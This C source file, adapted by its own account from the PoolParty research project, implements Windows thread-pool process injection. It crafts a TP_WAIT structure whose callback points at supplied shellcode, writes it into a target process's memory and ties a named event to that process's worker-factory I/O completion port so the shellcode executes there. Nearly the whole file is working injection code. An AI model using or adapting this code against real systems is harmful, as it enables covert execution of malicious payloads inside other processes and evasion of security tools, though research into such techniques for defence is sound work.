/*
* The code was adapted from the original C++ PoolParty project
* Credits: https://github.com/SafeBreach-Labs/PoolParty
*/


#include <windows.h>
#include <stdio.h>
#include "SetupExecution.h"
#include "winapi.h"
#include "syscalls.h"


#define POOL_PARTY_EVENT_NAME L"RAVEPARTY"


VOID
CALLBACK
MyWorkCallback(
	PTP_CALLBACK_INSTANCE Instance,
	PVOID                 Parameter,
	PTP_WORK              Work
)
{
	// Instance, Parameter, and Work not used in this example.
	UNREFERENCED_PARAMETER(Instance);
	UNREFERENCED_PARAMETER(Parameter);
	//UNREFERENCED_PARAMETER(Work);

	//printf("Work @ 0x%p\n", Work);

	BOOL bRet = FALSE;

	//
	// Do something when the work callback is invoked.
	//
	{
		printf("MyWorkCallback: Task performed.\n");
	}

	return;
}

#include <windows.h>
typedef NTSTATUS(NTAPI* TPALLOCWAIT)(_Out_ PTP_WAIT* WaitReturn,
	_In_ PTP_WAIT_CALLBACK  	    Callback,
	_Inout_opt_ PVOID  	            Context,
	_In_opt_ PTP_CALLBACK_ENVIRON  	CallbackEnviron
	);


PFULL_TP_WAIT w_CreateThreadpoolWait(PTP_WAIT_CALLBACK pWaitCallback, PVOID pWaitContext, PTP_CALLBACK_ENVIRON pCallbackEnviron) {
	TPALLOCWAIT pTpAllocWait = (TPALLOCWAIT) GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocWait");
	if (pTpAllocWait == NULL)
	{
		printf("Erropr resolving TpAllocWait\n");
		return NULL;
	}
	//PFULL_TP_WAIT pTpWait = (PFULL_TP_WAIT)CreateThreadpoolWait(pWaitCallback, pWaitCallback, pCallbackEnviron);
	PFULL_TP_WAIT pTpWait = NULL; //= (PFULL_TP_WAIT)CreateThreadpoolWait(pWaitCallback, pWaitCallback, pCallbackEnviron);
	NTSTATUS status = pTpAllocWait(&pTpWait, pWaitCallback, pWaitContext, pCallbackEnviron);
	printf("status : %x\n", status);
	
	if (NULL == pTpWait) {
		printf("Error : 0x%x\n", GetLastError());
		return NULL;
	}


	return pTpWait;
}


HANDLE SetupExecution(HANDLE hTarget, HANDLE hIoCompletion, PVOID shellcode_addr, PVOID params)
{
	PFULL_TP_WAIT pRemoteTpWait = NULL;
	PTP_DIRECT pRemoteTpDirect = NULL;
	//printf("sizeof(FULL_TP_WAIT) : %d\n", sizeof(FULL_TP_WAIT));
	printf("sizeof(FULL_TP_WAIT) : %d\n", sizeof(FULL_TP_WAIT));
	printf("sizeof(TP_DIRECT) : %d\n", sizeof(TP_DIRECT));

	printf("sizeof(struct _FULL_TP_TIMER) : %d\n", sizeof(struct _FULL_TP_TIMER));
	printf("sizeof(void*) : %d\n", sizeof(void*));
	printf("sizeof(union _LARGE_INTEGER) : %d\n", sizeof(union _LARGE_INTEGER));



	if (shellcode_addr == NULL)
	{
		printf("Shellcode is NULL\n\n");
		return -1;
	}


	PTP_WAIT_CALLBACK shellcode_callback = NULL;
	BOOL success = TRUE;
	NTSTATUS status = STATUS_SUCCESS;
	

	//shellcode_callback = (PTP_WAIT_CALLBACK)MyWorkCallback;
	//printf("MyWorkCallback : 0x%p\n", MyWorkCallback);
	//getchar();
	shellcode_callback = (PTP_WAIT_CALLBACK)shellcode_addr;
	
	PFULL_TP_WAIT pTpWait = w_CreateThreadpoolWait(shellcode_callback, params, NULL);
	printf("Created TP_WAIT structure associated with the shellcode\n");
	if (hTarget == (HANDLE)-1)
	{
		pRemoteTpWait = pTpWait;
		pRemoteTpDirect = &pTpWait->Direct;
	}
	else
	{
		pRemoteTpWait = (PFULL_TP_WAIT)w_VirtualAllocEx(hTarget, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		printf("Allocated TP_WAIT memory in the target process: %p\n", pRemoteTpWait);
		success = w_WriteProcessMemory(hTarget, pRemoteTpWait, pTpWait, sizeof(FULL_TP_WAIT));
		if (!success) return -1;

		printf("Written the specially crafted TP_WAIT structure to the target process\n");

		pRemoteTpDirect = (PTP_DIRECT)w_VirtualAllocEx(hTarget, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		printf("Allocated TP_DIRECT memory in the target process: %p\n", pRemoteTpDirect);
		success = w_WriteProcessMemory(hTarget, pRemoteTpDirect, &pTpWait->Direct, sizeof(TP_DIRECT));
		if (!success) return -1;

		printf("Written the TP_DIRECT structure to the target process\n");
		printf("&pTpWait->Direct : 0x%p\n", &pTpWait->Direct);
		printf("&pTpWait->WaitPkt 0x%p\n", &pTpWait->WaitPkt);
		printf("pTpWait : 0x%p\n", pTpWait);
	}


	HANDLE hEvent = w_CreateEvent(NULL, FALSE, FALSE, POOL_PARTY_EVENT_NAME);
	printf("Created event with name %ls\n", POOL_PARTY_EVENT_NAME);

	printf("pTpWait->WaitPkt : 0x%x\n", pTpWait->WaitPkt);
	printf("hIoCompletion : 0x%x\n", hIoCompletion);
	printf("hEvent : 0x%x\n", hEvent);
	status = w_ZwAssociateWaitCompletionPacket(pTpWait->WaitPkt, hIoCompletion, hEvent, pRemoteTpDirect, pRemoteTpWait, 0, 0, NULL);
	if (status != STATUS_SUCCESS)
	{
		printf("ZwAssociateWaitCompletionPacket Failed - NTSTATUS = 0x%x\n", status);
		return -1;
	}
	printf("Associated event with the IO completion port of the target process worker factory\n");

	/*
	success = w_SetEvent(hEvent);
	if (!success)
	{
		printf("SetEvent failed\n\n");
		return -1;
	}

	printf("Set event to queue a packet to the IO completion port of the target process worker factory \n");

	// CLEANUP
	
	CloseHandle(hEvent);
	*/
	return hEvent;
}